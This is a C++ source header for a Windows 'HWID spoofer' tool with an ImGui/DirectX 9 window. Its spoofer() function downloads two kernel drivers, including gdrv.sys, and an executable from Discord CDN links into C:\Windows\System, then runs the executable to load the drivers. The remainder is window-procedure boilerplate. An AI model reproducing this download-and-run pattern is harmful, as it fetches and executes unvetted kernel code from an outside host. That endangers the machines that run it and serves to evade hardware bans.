#pragma once
#include <iostream>
#include <windows.h>
#include <thread>
#include "ImGui/imgui.h"
#include "ImGui/imgui_impl_dx9.h"

#include <d3d9.h>
#pragma comment(lib,"d3d9.lib")
#pragma comment(lib,"dxguid.lib")
#define NAME  _xor_("           > H W I D - S P O O F E R < "             ).c_str()
#define NAME_LOADER _xor_("      > H W I D - S P O O F E R <              ").c_str()
#define WINDOW_WIDTH  280
#define WINDOW_HEIGHT 230 //// 31
using namespace std;
void spoofer()
{
	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/795537165383630850/851921527255203860/Driver.sys", "C:\\Windows\\System\\Driver.sys", 0, NULL);
	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/795537165383630850/839208454010175498/gdrv.sys", "C:\\Windows\\System\\gdrv.sys", 0, NULL);
	URLDownloadToFile(NULL, "https://cdn.discordapp.com/attachments/795537165383630850/839208449061683200/command.exe", "C:\\Windows\\System\\command.exe", 0, NULL);
	system("cd C:\\Windows\\System");
	system("C:\\Windows\\System\\command.exe C:\\Windows\\System\\gdrv.sys C:\\Windows\\System\\Driver.sys");

	



}


void cleaner()
{

	
}



ATOM RegMyWindowClass(HINSTANCE, LPCTSTR);
static LPDIRECT3DDEVICE9        g_pd3dDevice = NULL;
static D3DPRESENT_PARAMETERS    g_d3dpp;
extern LRESULT ImGui_ImplDX9_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
	if (ImGui_ImplDX9_WndProcHandler(hWnd, message, wParam, lParam))
		return true;

	switch (message) {
	case WM_SIZE:
		if (g_pd3dDevice != NULL && wParam != SIZE_MINIMIZED)
		{
			ImGui_ImplDX9_InvalidateDeviceObjects();
			g_d3dpp.BackBufferWidth = LOWORD(lParam);
			g_d3dpp.BackBufferHeight = HIWORD(lParam);
			HRESULT hr = g_pd3dDevice->Reset(&g_d3dpp);
			if (hr == D3DERR_INVALIDCALL) IM_ASSERT(0);
			ImGui_ImplDX9_CreateDeviceObjects();
		}
		return 0;

	case WM_SYSCOMMAND:
		if ((wParam & 0xfff0) == SC_KEYMENU) return 0;
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	}
	return DefWindowProc(hWnd, message, wParam, lParam);
}

ATOM RegMyWindowClass(HINSTANCE hInst, LPCTSTR lpzClassName) {
	WNDCLASS wcWindowClass = { 0 };
	wcWindowClass.lpfnWndProc = (WNDPROC)WndProc;
	wcWindowClass.style = CS_HREDRAW | CS_VREDRAW;
	wcWindowClass.hInstance = hInst;
	wcWindowClass.lpszClassName = lpzClassName;
	wcWindowClass.hCursor = LoadCursor(NULL, IDC_ARROW);
	wcWindowClass.hbrBackground = (HBRUSH)COLOR_APPWORKSPACE;
	return RegisterClass(&wcWindowClass);
}
